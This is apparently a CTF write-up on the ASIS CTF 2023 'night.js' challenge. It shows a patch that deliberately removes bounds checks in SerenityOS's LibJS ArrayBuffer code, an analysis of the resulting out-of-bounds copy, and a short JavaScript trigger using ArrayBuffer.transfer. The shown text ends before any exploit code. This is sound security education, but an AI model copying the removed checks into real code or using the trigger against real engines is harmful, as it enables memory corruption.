<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1952   jspwnnnnc 172.86.97.8 1337   [11 solves &#x2F; 271 points]  After CTF, I solved it myself without referring to Writeups. It was really fun! xD.This challenge is relat">
<meta property="og:type" content="article">
<meta property="og:title" content="ASIS CTF 2023 - night.js (JavaScript Engine)">
<meta property="og:url" content="https://jiravvit.github.io/230930-asisctf2023-nightjs/index.html">
<meta property="og:site_name" content="jir4vvit">
<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1952   jspwnnnnc 172.86.97.8 1337   [11 solves &#x2F; 271 points]  After CTF, I solved it myself without referring to Writeups. It was really fun! xD.This challenge is relat">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-09-30T22:00:00.000Z">
<meta property="article:modified_time" content="2023-09-30T23:12:30.241Z">
<meta property="article:author" content="jir4vvit">
<meta property="article:tag" content="oob">
<meta property="article:tag" content="javascript-engine">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/judi2.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
        
      
    
    <!-- title -->
    <title>ASIS CTF 2023 - night.js (JavaScript Engine)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/230609-dantectf2023-dantes_notebook/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230930-asisctf2023-nightjs/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&text=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&is_video=false&description=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ASIS CTF 2023 - night.js (JavaScript Engine)&body=Check out this article: https://jiravvit.github.io/230930-asisctf2023-nightjs/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&name=ASIS CTF 2023 - night.js (JavaScript Engine)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230930-asisctf2023-nightjs/&t=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#chall-txt"><span class="toc-number">1.1.</span> <span class="toc-text">chall.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chall-patch"><span class="toc-number">1.2.</span> <span class="toc-text">chall.patch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analysis-1"><span class="toc-number">1.3.</span> <span class="toc-text">Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        ASIS CTF 2023 - night.js (JavaScript Engine)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">jir4vvit</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-09-30T22:00:00.000Z" itemprop="datePublished">2023-10-01</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/ASIS/">ASIS</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/javascript-engine/" rel="tag">javascript-engine</a>, <a class="tag-link-link" href="/tags/oob/" rel="tag">oob</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <ul>
<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1952">https://ctftime.org/event/1952</a></li>
</ul>
<blockquote>
<p>jspwnnn<br><code>nc 172.86.97.8 1337</code></p>
</blockquote>
<ul>
<li>[11 solves &#x2F; 271 points]</li>
</ul>
<p>After CTF, I solved it myself without referring to Writeups. It was really fun! xD.<br>This challenge is related with JavaScript Engine, but it had different exploit solution with the other JavaScript Engine like JSC.</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="chall-txt"><a href="#chall-txt" class="headerlink" title="chall.txt"></a>chall.txt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commit hash: 799b465fac5672f167d6fec599fe167bce92862d</span><br><span class="line">You can build js with: `./Meta/serenity.sh run lagom js`.</span><br><span class="line">You probably don&#x27;t need to recompile since the provided binaries have debug symbols.</span><br></pre></td></tr></table></figure>

<h3 id="chall-patch"><a href="#chall-patch" class="headerlink" title="chall.patch"></a>chall.patch</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/./AK/ByteBuffer.h b/../patched-serenity/AK/ByteBuffer.h</span></span><br><span class="line"><span class="comment">index e2fc73bbfe..7bb7903e80 100644</span></span><br><span class="line"><span class="comment">--- a/./AK/ByteBuffer.h</span></span><br><span class="line"><span class="comment">+++ b/../patched-serenity/AK/ByteBuffer.h</span></span><br><span class="line"><span class="meta">@@ -104,7 +104,7 @@</span> public:</span><br><span class="line"> </span><br><span class="line">     [[nodiscard]] u8&amp; operator[](size_t i)</span><br><span class="line">     &#123;</span><br><span class="line"><span class="deletion">-        VERIFY(i &lt; m_size);</span></span><br><span class="line"><span class="addition">+        // VERIFY(i &lt; m_size);</span></span><br><span class="line">         return data()[i];</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/./Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp b/../patched-serenity/Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp</span></span><br><span class="line"><span class="comment">index 2f65f7b6ca..ee9a1ca00f 100644</span></span><br><span class="line"><span class="comment">--- a/./Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp</span></span><br><span class="line"><span class="comment">+++ b/../patched-serenity/Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp</span></span><br><span class="line"><span class="meta">@@ -80,10 +80,10 @@</span> void copy_data_block_bytes(ByteBuffer&amp; to_block, u64 to_index, ByteBuffer const&amp;</span><br><span class="line">     VERIFY(from_index + count &lt;= from_size);</span><br><span class="line"> </span><br><span class="line">     // 4. Let toSize be the number of bytes in toBlock.</span><br><span class="line"><span class="deletion">-    auto to_size = to_block.size();</span></span><br><span class="line"><span class="addition">+    // auto to_size = to_block.size();</span></span><br><span class="line"> </span><br><span class="line">     // 5. Assert: toIndex + count ≤ toSize.</span><br><span class="line"><span class="deletion">-    VERIFY(to_index + count &lt;= to_size);</span></span><br><span class="line"><span class="addition">+    // VERIFY(to_index + count &lt;= to_size);</span></span><br><span class="line"> </span><br><span class="line">     // 6. Repeat, while count &gt; 0,</span><br><span class="line">     while (count &gt; 0) &#123;</span><br><span class="line"><span class="meta">@@ -215,6 +215,7 @@</span> ThrowCompletionOr&lt;ArrayBuffer*&gt; array_buffer_copy_and_detach(VM&amp; vm, ArrayBuffer</span><br><span class="line"> </span><br><span class="line">     // 10. Let copyLength be min(newByteLength, arrayBuffer.[[ArrayBufferByteLength]]).</span><br><span class="line">     auto copy_length = min(new_byte_length, array_buffer.byte_length());</span><br><span class="line"><span class="addition">+    if(array_buffer.byte_length() &gt; 0x100) copy_length = array_buffer.byte_length();</span></span><br><span class="line"> </span><br><span class="line">     // 11. Let fromBlock be arrayBuffer.[[ArrayBufferData]].</span><br><span class="line">     // 12. Let toBlock be newBuffer.[[ArrayBufferData]].</span><br><span class="line"><span class="comment">diff --git a/./Userland/Utilities/js.cpp b/../patched-serenity/Userland/Utilities/js.cpp</span></span><br><span class="line"><span class="comment">index 78fe2e699c..1dace537ab 100644</span></span><br><span class="line"><span class="comment">--- a/./Userland/Utilities/js.cpp</span></span><br><span class="line"><span class="comment">+++ b/../patched-serenity/Userland/Utilities/js.cpp</span></span><br><span class="line"><span class="meta">@@ -343,34 +343,34 @@</span> void ReplObject::initialize(JS::Realm&amp; realm)</span><br><span class="line"> &#123;</span><br><span class="line">     Base::initialize(realm);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="deletion">-    u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;exit&quot;, exit_interpreter, 0, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;help&quot;, repl_help, 0, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;save&quot;, save_to_file, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-    define_native_accessor(</span></span><br><span class="line"><span class="deletion">-        realm,</span></span><br><span class="line"><span class="deletion">-        &quot;_&quot;,</span></span><br><span class="line"><span class="deletion">-        [](JS::VM&amp;) &#123;</span></span><br><span class="line"><span class="deletion">-            return g_last_value.value();</span></span><br><span class="line"><span class="deletion">-        &#125;,</span></span><br><span class="line"><span class="deletion">-        [](JS::VM&amp; vm) -&gt; JS::ThrowCompletionOr&lt;JS::Value&gt; &#123;</span></span><br><span class="line"><span class="deletion">-            auto&amp; global_object = vm.get_global_object();</span></span><br><span class="line"><span class="deletion">-            VERIFY(is&lt;ReplObject&gt;(global_object));</span></span><br><span class="line"><span class="deletion">-            outln(&quot;Disable writing last value to &#x27;_&#x27;&quot;);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-            // We must delete first otherwise this setter gets called recursively.</span></span><br><span class="line"><span class="deletion">-            TRY(global_object.internal_delete(JS::PropertyKey &#123; &quot;_&quot; &#125;));</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-            auto value = vm.argument(0);</span></span><br><span class="line"><span class="deletion">-            TRY(global_object.internal_set(JS::PropertyKey &#123; &quot;_&quot; &#125;, value, &amp;global_object));</span></span><br><span class="line"><span class="deletion">-            return value;</span></span><br><span class="line"><span class="deletion">-        &#125;,</span></span><br><span class="line"><span class="deletion">-        attr);</span></span><br><span class="line"><span class="addition">+    // define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="addition">+    // u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;exit&quot;, exit_interpreter, 0, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;help&quot;, repl_help, 0, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;save&quot;, save_to_file, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    // define_native_accessor(</span></span><br><span class="line"><span class="addition">+    //     realm,</span></span><br><span class="line"><span class="addition">+    //     &quot;_&quot;,</span></span><br><span class="line"><span class="addition">+    //     [](JS::VM&amp;) &#123;</span></span><br><span class="line"><span class="addition">+    //         return g_last_value.value();</span></span><br><span class="line"><span class="addition">+    //     &#125;,</span></span><br><span class="line"><span class="addition">+    //     [](JS::VM&amp; vm) -&gt; JS::ThrowCompletionOr&lt;JS::Value&gt; &#123;</span></span><br><span class="line"><span class="addition">+    //         auto&amp; global_object = vm.get_global_object();</span></span><br><span class="line"><span class="addition">+    //         VERIFY(is&lt;ReplObject&gt;(global_object));</span></span><br><span class="line"><span class="addition">+    //         outln(&quot;Disable writing last value to &#x27;_&#x27;&quot;);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    //         // We must delete first otherwise this setter gets called recursively.</span></span><br><span class="line"><span class="addition">+    //         TRY(global_object.internal_delete(JS::PropertyKey &#123; &quot;_&quot; &#125;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    //         auto value = vm.argument(0);</span></span><br><span class="line"><span class="addition">+    //         TRY(global_object.internal_set(JS::PropertyKey &#123; &quot;_&quot; &#125;, value, &amp;global_object));</span></span><br><span class="line"><span class="addition">+    //         return value;</span></span><br><span class="line"><span class="addition">+    //     &#125;,</span></span><br><span class="line"><span class="addition">+    //     attr);</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> JS_DEFINE_NATIVE_FUNCTION(ReplObject::save_to_file)</span><br><span class="line"><span class="meta">@@ -429,11 +429,11 @@</span> void ScriptObject::initialize(JS::Realm&amp; realm)</span><br><span class="line"> &#123;</span><br><span class="line">     Base::initialize(realm);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="deletion">-    u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="addition">+    // u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> JS_DEFINE_NATIVE_FUNCTION(ScriptObject::load_ini)</span><br></pre></td></tr></table></figure>

<p>I got errors when I applied it to my source using <code>git apply</code>. So I modified source codes myself.<br>By the way, when I checked it I knew this challenge is from <code>serenity</code>. </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/SerenityOS/serenity/tree/master">https://github.com/SerenityOS/serenity/tree/master</a></li>
</ul>
<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>The important part is <code>array_buffer_copy_and_detach</code> function in <code>ArrayBuffer.cpp</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 25.1.2.14 ArrayBufferCopyAndDetach ( arrayBuffer, newLength, preserveResizability ), https://tc39.es/proposal-arraybuffer-transfer/#sec-arraybuffer.prototype.transfertofixedlength</span></span><br><span class="line">ThrowCompletionOr&lt;ArrayBuffer*&gt; <span class="title function_">array_buffer_copy_and_detach</span><span class="params">(VM&amp; vm, ArrayBuffer&amp; array_buffer, Value new_length, PreserveResizability)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span>&amp; realm = *vm.current_realm();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. Perform ? RequireInternalSlot(arrayBuffer, [[ArrayBufferData]]).</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> 2. If IsSharedArrayBuffer(arrayBuffer) is true, throw a TypeError exception.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. If newLength is undefined, then</span></span><br><span class="line">    <span class="comment">// a. Let newByteLength be arrayBuffer.[[ArrayBufferByteLength]].</span></span><br><span class="line">    <span class="comment">// 4. Else,</span></span><br><span class="line">    <span class="comment">// a. Let newByteLength be ? ToIndex(newLength).</span></span><br><span class="line">    <span class="keyword">auto</span> new_byte_length = new_length.is_undefined() ? array_buffer.byte_length() : TRY(new_length.to_index(vm));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. If IsDetachedBuffer(arrayBuffer) is true, throw a TypeError exception.</span></span><br><span class="line">    <span class="keyword">if</span> (array_buffer.is_detached())</span><br><span class="line">        <span class="keyword">return</span> vm.throw_completion&lt;TypeError&gt;(ErrorType::DetachedArrayBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> 6. If preserveResizability is preserve-resizability and IsResizableArrayBuffer(arrayBuffer) is true, then</span></span><br><span class="line">    <span class="comment">// a. Let newMaxByteLength be arrayBuffer.[[ArrayBufferMaxByteLength]].</span></span><br><span class="line">    <span class="comment">// 7. Else,</span></span><br><span class="line">    <span class="comment">// a. Let newMaxByteLength be empty.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. If arrayBuffer.[[ArrayBufferDetachKey]] is not undefined, throw a TypeError exception.</span></span><br><span class="line">    <span class="keyword">if</span> (!array_buffer.detach_key().is_undefined())</span><br><span class="line">        <span class="keyword">return</span> vm.throw_completion&lt;TypeError&gt;(ErrorType::DetachKeyMismatch, array_buffer.detach_key(), js_undefined());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9. Let newBuffer be ? AllocateArrayBuffer(%ArrayBuffer%, newByteLength, <span class="doctag">FIXME:</span> newMaxByteLength).</span></span><br><span class="line">    <span class="keyword">auto</span>* new_buffer = TRY(allocate_array_buffer(vm, realm.intrinsics().array_buffer_constructor(), new_byte_length));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 10. Let copyLength be min(newByteLength, arrayBuffer.[[ArrayBufferByteLength]]).</span></span><br><span class="line">    <span class="keyword">auto</span> copy_length = min(new_byte_length, array_buffer.byte_length());</span><br><span class="line">    <span class="keyword">if</span>(array_buffer.byte_length() &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">        copy_length = array_buffer.byte_length();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 11. Let fromBlock be arrayBuffer.[[ArrayBufferData]].</span></span><br><span class="line">    <span class="comment">// 12. Let toBlock be newBuffer.[[ArrayBufferData]].</span></span><br><span class="line">    <span class="comment">// 13. Perform CopyDataBlockBytes(toBlock, 0, fromBlock, 0, copyLength).</span></span><br><span class="line">    <span class="comment">// 14. <span class="doctag">NOTE:</span> Neither creation of the new Data Block nor copying from the old Data Block are observable. Implementations may implement this method as a zero-copy move or a realloc.</span></span><br><span class="line">    copy_data_block_bytes(new_buffer-&gt;buffer(), <span class="number">0</span>, array_buffer.buffer(), <span class="number">0</span>, copy_length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 15. Perform ! DetachArrayBuffer(arrayBuffer).</span></span><br><span class="line">    TRY(detach_array_buffer(vm, array_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 16. Return newBuffer.</span></span><br><span class="line">    <span class="keyword">return</span> new_buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I wanted to trigger this function, But I didn’t know how to trigger it. So I read mozilla’s document. The reason I read this part was simply because this function was related to arraybuffer. (guessing with file name ^^)</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer.prototype.transfer() Experimental</span><br><span class="line">Creates a new ArrayBuffer with the same byte content as this buffer, then detaches this buffer.</span><br></pre></td></tr></table></figure>

<p>I realized I could use <code>transfer</code>. I was able to trigger it using the script below.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer)</span><br><span class="line">buffer.<span class="title function_">transfer</span>(<span class="number">0x8</span>);</span><br></pre></td></tr></table></figure>

<p>The important point in this function is how define <code>copy_length</code>. When size of old buffer(<code>arrray_buffer</code>) is over 0x100, size of <code>new_buffer</code> is same as old buffer. It is really important that <code>copy_length</code> is newly redefined because the argument of <code>transfer</code> is passed to malloc as a size, which creates a new buffer. </p>
<p>In the JavaScript above is original <code>copy_length</code> is 0x20, but size of <code>array_buffer</code> is over 0x100, so it is redefined as 0x120!</p>
